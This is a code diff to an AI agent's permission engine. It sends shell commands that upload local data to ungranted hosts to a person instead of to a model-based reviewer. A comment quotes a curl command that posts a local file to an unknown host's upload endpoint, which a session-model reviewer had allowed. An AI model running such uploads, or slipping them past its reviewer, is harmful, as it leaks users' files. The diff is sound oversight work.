@@ -495,6 +495,9 @@ INERT_WRITE_REASON = "inert, reversible write inside your folders"
 # OPE-234: the reason prefix of a read-only command the tier let through.
 READONLY_COMMAND_REASON = "read-only command inside your folders"
 SECRET_EGRESS_REASON = "this sends a secret-looking file or value off the machine — approval required"
+# Round-2 F-5: Auto-Approve sends this to a person, not the reviewer. The card shows the
+# command, so the host is not repeated here.
+UPLOAD_EGRESS_REASON = "this sends local files or data to a site you have not allowed — approval required"
 
 
 # The transcript's full Auto-Approve explainer (owner copy 2026-08-24). Persisted as a
@@ -725,6 +728,11 @@ class PermissionEngine:
     # A file the agent filled with a key and then sends is caught even when the file can't
     # be read back (moved, over the size cap, outside the folders).
     agent_file_has_secret: Optional[Callable[[Path], bool]] = None
+    # "Is this exact call a step of the plan the user approved?" (OPE-237, matched by
+    # code: same file, same command, same destination). An approved upload step is the
+    # user granting that destination, so round-2 F-5's upload check leaves it to the
+    # reviewer, which weighs the step as the user's own request.
+    approved_plan_step: Optional[Callable[[str, dict[str, Any]], bool]] = None
     # OPE-234 gate tier, Auto-Approve only: "off" (default), "audit" or "on", like
     # `inert_writes`. User-global config, never a workspace's.
     readonly_commands: str = "off"
@@ -996,6 +1004,21 @@ class PermissionEngine:
         # Custom mode auto-approves the configured tools.
         if self.mode is Mode.CUSTOM and tool_name in self.auto_allow_tools:
             return Decision(True, "auto-allowed by config")
+
+        # Round-2 F-5: in Auto-Approve, a command that sends local files or data to a host
+        # the user has not granted reaches a person, not the reviewer. A session-model
+        # reviewer allowed `curl -X POST https://<unknown host>/upload --data-binary
+        # @notes.txt`; where data may go is decided here, by code. A granted host (the
+        # machine's allowed sites, a site or domain allowed for this session, the settings'
+        # allowed domains) leaves the command to the reviewer as before: a grant restores
+        # its judgement, it does not skip it. The user's own command allowlist and Custom
+        # mode's auto-allow returned above, as they do for every other command.
+        if is_shell and self.mode is Mode.AUTO_APPROVE:
+            if (
+                self._ungranted_upload_hosts(str(arguments.get("command", ""))) is not None
+                and not self._is_approved_plan_step(tool_name, arguments)
+            ):
+                return Decision(False, UPLOAD_EGRESS_REASON, needs_user=True, human_only=True)
 
         # OPE-234: in Auto-Approve, a read-only command (or a sequence of them) inside the
         # folders needs no reviewer call. Last checks on purpose, like the inert-write tier
@@ -1392,6 +1415,29 @@ class PermissionEngine:
         if not self._under_root(str(full)):
             return False
         return bool(file_has_secret(full))
+
+    def _is_approved_plan_step(self, tool_name: str, arguments: dict[str, Any]) -> bool:
+        if self.approved_plan_step is None:
+            return False
+        try:
+            return bool(self.approved_plan_step(tool_name, arguments))
+        except Exception:  # noqa: BLE001 - a broken callback grants nothing
+            return False
+
+    def _ungranted_upload_hosts(self, command: str) -> Optional[list[str]]:
+        """Round-2 F-5: the hosts a command sends local data to that the user has not
+        granted, or None when it sends none or every host is granted. An unreadable host
+        ("") is never granted."""
+        from . import review_facts as rf
+
+        hosts = rf.shell_upload_hosts(command, self.shell_kind or "bash") if command else None
+        if hosts is None:
+            return None
+        ungranted = [
+            h for h in dict.fromkeys(hosts)
+            if not h or not (self._site_allowed(h) or self._domain_allowed(h))
+        ]
+        return ungranted or None
 
     def _sends_secret(self, tool_name: str, arguments: dict[str, Any], risk: RiskClass) -> bool:
         """OPE-236: the call sends data off the machine AND a secret is involved.
